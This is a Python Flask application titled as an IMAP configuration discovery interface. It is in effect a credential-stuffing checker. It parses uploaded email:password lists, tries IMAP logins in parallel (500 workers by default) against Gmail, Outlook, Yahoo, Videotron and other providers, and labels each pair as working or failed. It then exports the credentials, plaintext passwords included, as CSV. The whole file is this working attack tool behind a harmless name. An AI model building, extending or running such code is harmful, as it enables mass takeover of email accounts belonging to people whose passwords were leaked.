#!/usr/bin/env python3
"""
Flask Backend for IMAP Configuration Discovery Web Interface
"""

from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import tempfile
import os
import json
import threading
import socket
import uuid
import dns.resolver
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)
CORS(app)

def parse_email_content(content):
    """Parse email:password content and return list of email data with passwords"""
    email_data = []
    passwords = {}
    lines = content.split('\n')
    
    for line in lines:
        line = line.strip()
        if ':' in line and '@' in line:
            parts = line.split(':', 1)  # Split only on first ':'
            if len(parts) == 2:
                email = parts[0].strip()
                password = parts[1].strip()
                if '@' in email and '.' in email:
                    email_lower = email.lower()
                    email_data.append(email_lower)
                    passwords[email_lower] = password
    
    return email_data, passwords

# Global storage for processing status
processing_status = {}
processing_lock = threading.Lock()

@app.route('/')
def index():
    """Serve the main HTML page"""
    try:
        return send_from_directory('.', 'index.html')
    except Exception as e:
        return f"Error loading index.html: {str(e)}", 500

@app.route('/app.js')
def serve_js():
    """Serve JavaScript file"""
    try:
        return send_from_directory('.', 'app.js')
    except Exception as e:
        return f"Error loading app.js: {str(e)}", 500

@app.route('/api/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'ok',
        'message': 'IMAP Discovery API is running',
        'version': '1.0'
    })

@app.route('/<path:filename>')
def static_files(filename):
    """Serve static files"""
    try:
        # Security check - only allow certain file types
        allowed_extensions = ['.html', '.js', '.css', '.ico', '.png', '.jpg', '.jpeg', '.gif']
        if any(filename.lower().endswith(ext) for ext in allowed_extensions):
            return send_from_directory('.', filename)
        else:
            return "File type not allowed", 403
    except Exception as e:
        return f"Error loading {filename}: {str(e)}", 404

@app.route('/api/process', methods=['POST'])
def process_emails():
    """Process uploaded email file and return IMAP configurations"""
    try:
        # Check if file was uploaded
        if 'file' not in request.files:
            return jsonify({'error': 'No file uploaded'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        # Get processing parameters - optimized defaults for speed
        timeout = int(request.form.get('timeout', 3))  # Reduced timeout for faster processing
        workers = int(request.form.get('workers', 500))  # Increased workers for parallel processing
        limit = request.form.get('limit', '')
        limit = int(limit) if limit else None
        
        # Generate unique processing ID
        process_id = str(uuid.uuid4())
        
        # Initialize processing status
        with processing_lock:
            processing_status[process_id] = {
                'status': 'starting',
                'progress': 0,
                'current_email': '',
                'total_emails': 0,
                'processed': 0,
                'results': []
            }
        
        # Read file content immediately and safely
        try:
            file_content = file.read().decode('utf-8')
        except Exception as e:
            with processing_lock:
                processing_status[process_id]['status'] = 'error'
                processing_status[process_id]['error'] = f'Error reading file: {str(e)}'
            return jsonify({'error': f'Error reading file: {str(e)}'}), 400
        
        # Start processing in background thread
        thread = threading.Thread(
            target=process_emails_background,
            args=(file_content, process_id, timeout, workers, limit)
        )
        thread.daemon = True
        thread.start()
        
        return jsonify({
            'process_id': process_id,
            'message': 'Processing started'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

def process_emails_background(content, process_id, timeout, workers, limit):
    """Background function to process emails"""
    try:
        # Update status
        with processing_lock:
            processing_status[process_id]['status'] = 'reading_data'
            processing_status[process_id]['progress'] = 5
        
        # Extract emails and passwords directly from content
        emails, passwords = parse_email_content(content)
        
        if not emails:
            with processing_lock:
                processing_status[process_id]['status'] = 'error'
                processing_status[process_id]['error'] = 'No valid emails found in the provided data'
            return
        
        # Apply limit if specified
        if limit and limit > 0:
            emails = emails[:limit]
        
        total_emails = len(emails)
        
        with processing_lock:
            processing_status[process_id]['total_emails'] = total_emails
            processing_status[process_id]['status'] = 'processing'
            processing_status[process_id]['progress'] = 10
        
        # Process emails with parallel threading for maximum speed
        results = process_emails_with_progress_parallel(emails, passwords, process_id, timeout, workers)
        
        # Calculate statistics
        successful = len([r for r in results if r.get('imap_server') and r.get('status') == 'success'])
        login_failed = len([r for r in results if r.get('imap_server') and r.get('status') == 'login_failed'])
        server_found = len([r for r in results if r.get('imap_server') and r.get('status') == 'server_found'])
        failed = len([r for r in results if r.get('status') == 'failed'])
        success_rate = (successful / total_emails * 100) if total_emails > 0 else 0
        
        # Update final status
        with processing_lock:
            processing_status[process_id].update({
                'status': 'completed',
                'progress': 100,
                'results': results,
                'statistics': {
                    'total': total_emails,
                    'successful': successful,
                    'login_failed': login_failed,
                    'server_found': server_found,
                    'failed': failed,
                    'success_rate': round(success_rate, 1)
                }
            })
            
    except Exception as e:
        print(f"Processing error: {e}")
        with processing_lock:
            processing_status[process_id]['status'] = 'error'
            processing_status[process_id]['error'] = f'Processing error: {str(e)}'

def process_emails_with_progress_parallel(emails, passwords, process_id, timeout, max_workers):
    """Process emails with parallel threading for optimal speed"""
    results = []
    processed_count = 0
    total_emails = len(emails)
    
    def process_single_email(email):
        """Process a single email in parallel"""
        try:
            domain = email.split('@')[1] if '@' in email else ''
            password = passwords.get(email, '')
            
            # Use simplified IMAP discovery with password testing
            found_config = find_imap_simple(email, domain, timeout, password)
            
            if found_config:
                # Determine status based on login verification
                if found_config.get('login_verified') is True:
                    status = 'success'
                elif found_config.get('login_verified') is False:
                    status = 'login_failed'
                else:
                    status = 'server_found'
                
                return {
                    'email': email,
                    'domain': domain,
                    'imap_server': found_config['server'],
                    'port': found_config['port'],
                    'password': password,
                    'status': status,
                    'login_verified': found_config.get('login_verified')
                }
            else:
                return {
                    'email': email,
                    'domain': domain,
                    'imap_server': '',
                    'port': '',
                    'password': password,
                    'status': 'failed',
                    'login_verified': False
                }
        except Exception as e:
            domain = email.split('@')[1] if '@' in email else ''
            return {
                'email': email,
                'domain': domain,
                'imap_server': '',
                'port': '',
                'password': passwords.get(email, ''),
                'status': 'error',
                'error': str(e),
                'login_verified': False
            }
    
    # Use ThreadPoolExecutor for parallel processing
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all email processing tasks
        future_to_email = {
            executor.submit(process_single_email, email): email 
            for email in emails
        }
        
        # Process results as they complete
        for future in as_completed(future_to_email):
            email = future_to_email[future]
            try:
                result = future.result()
                results.append(result)
                processed_count += 1
                
                # Update progress more frequently for better UX
                progress = 10 + (processed_count / total_emails) * 80  # 10% to 90%
                with processing_lock:
                    processing_status[process_id]['progress'] = int(progress)
                    processing_status[process_id]['current_email'] = email
                    processing_status[process_id]['processed'] = processed_count
                    
            except Exception as e:
                print(f"Error processing {email}: {e}")
                # Add failed entry
                domain = email.split('@')[1] if '@' in email else ''
                results.append({
                    'email': email,
                    'domain': domain,
                    'imap_server': '',
                    'port': '',
                    'password': passwords.get(email, ''),
                    'status': 'error',
                    'error': str(e)
                })
                processed_count += 1
    
    return results

def test_imap_connection(host, port, timeout):
    """Test actual IMAP connection to verify server works"""
    try:
        import imaplib
        if port == 993:
            # SSL connection
            with imaplib.IMAP4_SSL(host, port, timeout=timeout) as imap:
                # Just check if we can connect and get greeting
                return True
        else:
            # Non-SSL connection
            with imaplib.IMAP4(host, port, timeout=timeout) as imap:
                return True
    except Exception as e:
        return False

def test_imap_login(host, port, email, password, timeout):
    """Test actual IMAP login with email and password"""
    try:
        import imaplib
        if port == 993:
            # SSL connection
            with imaplib.IMAP4_SSL(host, port, timeout=timeout) as imap:
                # Try to login with credentials
                imap.login(email, password)
                return True
        else:
            # Non-SSL connection
            with imaplib.IMAP4(host, port, timeout=timeout) as imap:
                # Try to login with credentials
                imap.login(email, password)
                return True
    except Exception as e:
        return False

def dns_lookup(domain, record_type='MX'):
    """Perform DNS lookup for a domain"""
    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 5
        resolver.lifetime = 5
        
        if record_type == 'MX':
            answers = resolver.resolve(domain, 'MX')
            return [str(answer.exchange).rstrip('.') for answer in answers]
        elif record_type == 'A':
            answers = resolver.resolve(domain, 'A')
            return [str(answer) for answer in answers]
        elif record_type == 'CNAME':
            answers = resolver.resolve(domain, 'CNAME')
            return [str(answer.target).rstrip('.') for answer in answers]
    except Exception as e:
        print(f"DNS lookup failed for {domain}: {e}")
        return []

def get_mx_records(domain):
    """Get MX records for a domain"""
    return dns_lookup(domain, 'MX')

def test_videotron_connection(email, password, timeout=10):
    """Specialized test for Videotron accounts"""
    videotron_servers = [
        ('imap.videotron.ca', 993),
        ('mail.videotron.ca', 993),
        ('imap.videotron.ca', 143),
        ('pop.videotron.ca', 995),
        ('pop.videotron.ca', 110)
    ]
    
    for host, port in videotron_servers:
        try:
            # Test connection
            with socket.create_connection((host, port), timeout=timeout):
                if port in [993, 143]:  # IMAP ports
                    if test_imap_connection(host, port, timeout):
                        if test_imap_login(host, port, email, password, timeout):
                            return {'server': host, 'port': port, 'login_verified': True, 'provider': 'videotron'}
                        else:
                            return {'server': host, 'port': port, 'login_verified': False, 'provider': 'videotron'}
                elif port in [995, 110]:  # POP ports
                    # Add POP3 login test here if needed
                    return {'server': host, 'port': port, 'login_verified': None, 'provider': 'videotron'}
        except:
            continue
    
    return None

def find_imap_simple(email, domain, timeout, password=None):
    """Optimized IMAP discovery with actual IMAP testing and login verification"""
    
    # Provider-specific fast paths (most reliable)
    provider_configs = {
        'gmail.com': [('imap.gmail.com', 993)],
        'outlook.com': [('imap-mail.outlook.com', 993), ('outlook.office365.com', 993)],
        'hotmail.com': [('imap-mail.outlook.com', 993)],
        'live.com': [('imap-mail.outlook.com', 993)],
        'yahoo.com': [('imap.mail.yahoo.com', 993)],
        'yahoo.co.uk': [('imap.mail.yahoo.com', 993)],
        'yahoo.ca': [('imap.mail.yahoo.com', 993)],
        'aol.com': [('imap.aol.com', 993)],
        'zoho.com': [('imap.zoho.com', 993)],
        'mail.com': [('imap.mail.com', 993)],
        'gmx.com': [('imap.gmx.com', 993)],
        'web.de': [('imap.web.de', 993)],
        'peoplepc.com': [('imap.peoplepc.com', 143), ('imap.peoplepc.com', 993)],
        # Videotron-specific configurations
        'videotron.ca': [('imap.videotron.ca', 993), ('mail.videotron.ca', 993), ('imap.videotron.ca', 143)],
    }
    
    # Road Runner (rr.com) domains use webmail pattern
    if domain.endswith('.rr.com'):
        provider_configs[domain] = [(f'webmail.{domain}', 993), (f'imap.{domain}', 993)]
    
    # Special handling for Videotron accounts
    if domain == 'videotron.ca' and password:
        videotron_result = test_videotron_connection(email, password, timeout)
        if videotron_result:
            return videotron_result
    
    # Check provider-specific configs first
    if domain in provider_configs:
        for host, port in provider_configs[domain]:
            try:
                # First check if port is open
                with socket.create_connection((host, port), timeout=timeout):
                    # Then test actual IMAP connection
                    if test_imap_connection(host, port, timeout):
                        # If password provided, test login
                        if password:
                            if test_imap_login(host, port, email, password, timeout):
                                return {'server': host, 'port': port, 'login_verified': True}
                            else:
                                return {'server': host, 'port': port, 'login_verified': False}
                        else:
                            return {'server': host, 'port': port, 'login_verified': None}
            except:
                continue
    
    # DNS-based discovery: Get MX records and try common patterns
    mx_records = get_mx_records(domain)
    dns_patterns = []
    
    # Add MX record patterns
    for mx in mx_records[:3]:  # Limit to first 3 MX records
        mx_domain = mx.rstrip('.')
        dns_patterns.extend([
            (mx_domain, 993),
            (mx_domain, 143),
            (f"imap.{mx_domain}", 993),
            (f"imap.{mx_domain}", 143),
        ])
    
    # Generic patterns (prioritized by likelihood)
    generic_patterns = [
        (f"imap.{domain}", 993),
        (f"imap.{domain}", 143),
        (f"mail.{domain}", 993),
        (f"mail.{domain}", 143),
        (f"webmail.{domain}", 993),  # Added webmail pattern for Road Runner and others
        (f"webmail.{domain}", 143),
        (domain, 993),
        (domain, 143),
    ]
    
    # Combine DNS patterns with generic patterns (DNS first)
    all_patterns = dns_patterns + generic_patterns
    
    # Test all patterns (DNS + generic)
    for host, port in all_patterns:
        try:
            # First check if port is open
            with socket.create_connection((host, port), timeout=timeout):
                # Then test actual IMAP connection
                if test_imap_connection(host, port, timeout):
                    # If password provided, test login
                    if password:
                        if test_imap_login(host, port, email, password, timeout):
                            return {'server': host, 'port': port, 'login_verified': True}
                        else:
                            return {'server': host, 'port': port, 'login_verified': False}
                    else:
                        return {'server': host, 'port': port, 'login_verified': None}
        except:
            continue
    
    return None

@app.route('/api/status/<process_id>', methods=['GET'])
def get_processing_status(process_id):
    """Get current processing status"""
    with processing_lock:
        if process_id not in processing_status:
            return jsonify({'error': 'Process not found'}), 404
        
        status = processing_status[process_id].copy()
        
        # Clean up completed processes after returning status
        if status['status'] in ['completed', 'error']:
            # Keep the status for a bit longer in case of retries
            pass
    
    return jsonify(status)

@app.route('/api/process-text', methods=['POST'])
def process_text_emails():
    """Process email text data directly without file upload"""
    try:
        # Get JSON data
        data = request.get_json()
        if not data or 'email_text' not in data:
            return jsonify({'error': 'No email text provided'}), 400
        
        email_text = data['email_text']
        if not email_text.strip():
            return jsonify({'error': 'Email text is empty'}), 400
        
        # Get processing parameters - optimized defaults for speed
        timeout = int(data.get('timeout', 3))  # Reduced timeout for faster processing
        workers = int(data.get('workers', 500))  # Increased workers for parallel processing
        limit = data.get('limit')
        limit = int(limit) if limit else None
        
        # Generate unique processing ID
        import uuid
        process_id = str(uuid.uuid4())
        
        # Initialize processing status
        with processing_lock:
            processing_status[process_id] = {
                'status': 'starting',
                'progress': 0,
                'current_email': '',
                'total_emails': 0,
                'processed': 0,
                'results': []
            }
        
        # Start processing in background thread
        thread = threading.Thread(
            target=process_emails_background,
            args=(email_text, process_id, timeout, workers, limit)
        )
        thread.daemon = True
        thread.start()
        
        return jsonify({
            'process_id': process_id,
            'message': 'Text processing started'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/export/<process_id>', methods=['GET'])
def export_results(process_id):
    """Export results as CSV"""
    with processing_lock:
        if process_id not in processing_status:
            return jsonify({'error': 'Process not found'}), 404
        
        status = processing_status[process_id]
        if status['status'] != 'completed':
            return jsonify({'error': 'Processing not completed'}), 400
        
        results = status['results']
    
    # Generate CSV content
    csv_lines = ['email,domain,imap_server,port,password']
    
    # Use the actual passwords stored in results
    for result in results:
        password = result.get('password', '***PASSWORD***')
        csv_lines.append(f"{result['email']},{result['domain']},{result['imap_server']},{result['port']},{password}")
    
    csv_content = '\n'.join(csv_lines)
    
    # Return CSV as attachment
    from flask import Response
    return Response(
        csv_content,
        mimetype='text/csv',
        headers={'Content-Disposition': 'attachment; filename=imap_configurations.csv'}
    )

@app.route('/api/cleanup/<process_id>', methods=['DELETE'])
def cleanup_process(process_id):
    """Clean up processing data"""
    with processing_lock:
        if process_id in processing_status:
            del processing_status[process_id]
    
    return jsonify({'message': 'Process cleaned up'})

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Endpoint not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    print("🚀 Starting IMAP Discovery Web Interface...")
    print("📧 Upload your email:password files via the web interface")
    print("🔍 Automatic IMAP server discovery with real connection testing")
    print("📊 Professional results display with export functionality")
    print("\n💻 Server running at: http://localhost:5000")
    print("🌐 Open this URL in your web browser\n")
    
    app.run(debug=True, host='0.0.0.0', port=5001)



